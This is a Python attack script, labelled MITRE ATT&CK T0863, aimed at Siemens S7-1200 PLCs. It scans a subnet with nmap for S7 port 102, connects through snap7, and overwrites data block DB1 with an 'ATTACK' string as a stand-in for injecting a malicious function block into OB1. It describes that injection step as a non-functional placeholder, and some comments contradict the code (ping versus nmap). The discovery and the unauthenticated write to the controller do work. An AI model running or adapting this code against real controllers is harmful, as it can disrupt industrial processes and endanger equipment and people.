# MITRE ATT&CK Technique T0863: Modify Controller Tasking (Siemens S7-1200)
# This script attempts to add a malicious function block (FB) to the OB1 task in a Siemens S7-1200 PLC.
# WARNING: This script is for educational and research purposes ONLY. 
#          Executing this script on a real PLC can cause serious damage and disruption.
#          Use at your own risk.  UNDER NO CIRCUMSTANCES EXECUTE THIS AGAINST A PRODUCTION PLC.

import snap7
import snap7.client
from snap7.util import *
from snap7.types import *
import struct
import subprocess  # For IP address discovery
import re  # For IP address extraction
import time

# Configuration (Modify these values)
PLC_IP = None # Will be discovered if None
RACK = 0
SLOT = 1
MALICIOUS_FB_NAME = "MaliciousFB" # Name of the FB to inject.  Must already EXIST.  Creating FBs is significantly more complex.
OB1_NAME = "Organization Block_1 [OB1]" #This the default for Siemens OB1
# IMPORTANT: This example assumes the malicious FB already exists in the project.  Creating a new FB
# dynamically via S7 communication is a much more complex task.  For a proof of concept, pre-create the 
# FB in TIA Portal and compile it to the PLC *first*.

def discover_plc_ip():
    """
    Discovers the PLC's IP address using the 'ping' command.
    Assumes the PLC is on the same network and responds to ping.
    This is a very basic method and might not work in all network configurations.
    """
    try:
        # Use nmap to discover Siemens PLCs, filtering specifically for those running on the default S7 Port 102
        nmap_command = ['nmap', '-p', '102', '-Pn', '-T4', '192.168.0.0/24'] # Assumes 192.168.0.0/24 network, MODIFY as needed
        nmap_output = subprocess.check_output(nmap_command, shell=False, text=True)

        # Extract the IP address from the nmap output
        ip_pattern = r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        match = re.search(ip_pattern, nmap_output)

        if match:
            discovered_ip = match.group(1)
            print(f"Discovered PLC IP address: {discovered_ip}")
            return discovered_ip
        else:
            print("No Siemens PLC found on the network.  Adjust the NMAP command.")
            return None


    except subprocess.CalledProcessError as e:
        print(f"Error running ping command: {e}")
        return None
    except FileNotFoundError:
        print("nmap is not installed.  Install it.")
        return None
    except Exception as e:
        print(f"An unexpected error occurred during IP discovery: {e}")
        return None

def read_s7_string(client, db_number, start, size):
    """Reads a STRING from a PLC DB.  Handles the length byte."""
    buffer = client.db_read(db_number, start, size)
    max_length = buffer[0]
    actual_length = buffer[1]
    return buffer[2:2+actual_length].decode('ascii') # Or 'utf-8' depending on PLC config

def write_s7_string(client, db_number, start, string):
    """Writes a STRING to a PLC DB.  Handles the length byte."""
    byte_string = string.encode('ascii') # Or 'utf-8' depending on PLC config
    actual_length = len(byte_string)
    max_length = 254  # Assuming maximum string length
    
    if actual_length > max_length:
        raise ValueError(f"String length exceeds maximum allowed length of {max_length}")

    data = bytearray()
    data.append(max_length)
    data.append(actual_length)
    data.extend(byte_string)

    client.db_write(db_number, start, data)


def find_ob1_task(client):
    """
    This is a VERY SIMPLIFIED approach and might not work in all scenarios.
    It attempts to find OB1 by name (which is usually 'Organization Block_1 [OB1]').
    A robust implementation would involve reading the task configuration data blocks directly, which is complex.
    """
    # In a real attack, you'd need a MUCH more sophisticated way to find OB1.
    # This is a shortcut for demonstration purposes.  Reading and parsing the PLC's task configuration DBs
    # would be the proper (and much harder) way.
    # This example *assumes* OB1 is named "Organization Block_1 [OB1]".  This is the default.
    # In a real scenario, the attacker would have to reverse engineer the PLC configuration to 
    # reliably find OB1 (and other important tasks).

    return OB1_NAME  # Return the hardcoded name, assuming it exists.



def inject_function_block(client, ob1_name, fb_name):
    """
    Injects a Function Block (FB) call into the OB1 task.
    This is a SIMPLIFIED example.  Real-world injection requires much more sophisticated techniques.
    This is a placeholder function.  The actual implementation is *highly* PLC-specific and requires deep knowledge of the PLC's memory layout and task scheduling mechanisms.
    For S7-1200, this is NOT directly possible via simple S7 communication.  You CANNOT directly edit OB1 in this way.

    This function demonstrates the INTENT, but it DOES NOT implement a functional OB1 injection.
    Instead, it will print a warning and then attempt to WRITE a string to a DB, as a (very poor) surrogate for modifying OB1.
    """

    print("*** WARNING: Direct OB1 injection via S7 communication is NOT directly supported in S7-1200. ***")
    print("*** This is a placeholder to demonstrate the *intent* of the attack. ***")
    print("*** A real attack would likely involve exploiting vulnerabilities in the PLC's firmware or using malicious TIA Portal projects. ***")

    # *** INSTEAD, we'll perform a (completely unrelated) string write as a placeholder. ***
    print(f"Simulating FB injection by writing a string to DB1. This is NOT OB1 injection.")

    try:
        write_s7_string(client, 1, 0, f"ATTACK: Executing {fb_name}!")
        print(f"Successfully 'injected' {fb_name} by writing a string.  THIS IS NOT REAL INJECTION.")
    except Exception as e:
        print(f"Error writing to DB1 (simulated injection failed): {e}")



def main():
    global PLC_IP  # Access the global PLC_IP variable

    if PLC_IP is None:
        PLC_IP = discover_plc_ip()
        if PLC_IP is None:
            print("Could not discover PLC IP address.  Exiting.")
            return


    print(f"Using PLC IP address: {PLC_IP}")

    try:
        client = snap7.client.Client()
        client.connect(PLC_IP, RACK, SLOT)
        print(f"Connected to PLC at {PLC_IP}, Rack={RACK}, Slot={SLOT}")

        # 1. Find the OB1 task (Simplified approach)
        ob1_name = find_ob1_task(client)
        print(f"Identified OB1 task as: {ob1_name}")

        # 2. Inject the malicious function block into OB1
        inject_function_block(client, ob1_name, MALICIOUS_FB_NAME)


    except snap7.exceptions.Snap7Exception as e:
        print(f"Snap7 error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 'client' in locals() and client.get_connected():  # Check if client exists AND is connected
            client.disconnect()
            client.destroy()  # Release resources
            print("Disconnected from PLC.")


if __name__ == "__main__":
    main()